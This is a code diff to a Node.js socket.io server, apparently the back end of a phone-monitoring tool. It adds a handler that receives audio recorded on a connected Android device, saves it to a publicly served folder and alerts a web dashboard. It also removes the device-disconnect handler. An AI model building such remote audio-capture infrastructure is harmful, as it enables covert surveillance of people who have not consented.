@@ -77,12 +77,14 @@ io.on('connection', (socket) => {
             } catch (e) { console.error("Download error:", e); }
         });
 
-        socket.on('disconnect', (reason) => {
-            console.log(`[-] ANDROID DISCONNECTED: ${reason}`);
-            if (socket === androidSocket) {
-                androidSocket = null;
-                if (webSocket) webSocket.emit('device_status', { connected: false });
-            }
+        socket.on('child_audio_recorded', (data) => {
+            try {
+                if (!fs.existsSync('public/downloads')) fs.mkdirSync('public/downloads');
+                const buffer = Buffer.from(data.audio, 'base64');
+                const fileName = `recording_${Date.now()}.mp3`;
+                fs.writeFileSync(`public/downloads/${fileName}`, buffer);
+                if (webSocket) webSocket.emit('audio_ready', { url: `/downloads/${fileName}`, name: fileName });
+            } catch (e) { console.error("Audio save error:", e); }
         });
     }
 
